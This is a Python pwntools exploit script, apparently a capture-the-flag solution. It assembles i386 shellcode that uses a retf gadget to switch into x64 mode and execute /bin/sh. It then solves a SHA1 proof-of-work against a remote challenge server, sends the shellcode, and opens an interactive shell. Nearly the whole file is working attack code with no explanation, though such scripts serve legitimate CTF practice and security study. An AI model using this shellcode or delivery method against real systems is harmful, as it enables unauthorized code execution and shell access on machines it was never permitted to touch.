from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

script = "b *main+519"

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

sc = pwnlib.shellcraft.i386
context.arch = 'i386'

# Dummy instruction for retf gadget
shell = asm('mov al, 0xcb')         # \xcb : retf

# x64 execve argument setting (not x86)
shell += asm('mov esp, gs:[ebx]')   # Usable memory addr
shell += asm('push ebx')
shell += asm('push 0x68732f2f')
shell += asm('push 0x6e69622f')
shell += asm('mov edi, esp')
shell += asm('mov al, 59')
shell += '\x6a\x33' # push 0x33

# Change to x64 mode
# Call to retf instruction (to push current eip)
shell += '\xe8\xe6\xff\xff\xff' 
shell += '\x0f\x05'     # syscall

print "length: %d" % len(shell)

shell = shell.ljust(0x1e, "\x90")

print shell.encode('hex')

p = remote('asm3.eatpwnnosleep.com', 1234)

r("with ")

base = r(" ")[:-1]

i = 0
while True:
  st = hex(i)[2:]
  msg = base + st.rjust(8, '0')

  m = hashlib.sha1(msg)
  sha1val = m.hexdigest()

  if sha1val[:6] == "000000":
    print msg, sha1val 

  if sha1val[:7] == "0000000":
    s(msg)
    break

  i += 1

r("shellcode:")
s(shell, False)

r("see\n")

try:
  s("/bin/ls")
  response = r("\n")

  print response

  p.interactive()
  p.close()

except:
  p.close()
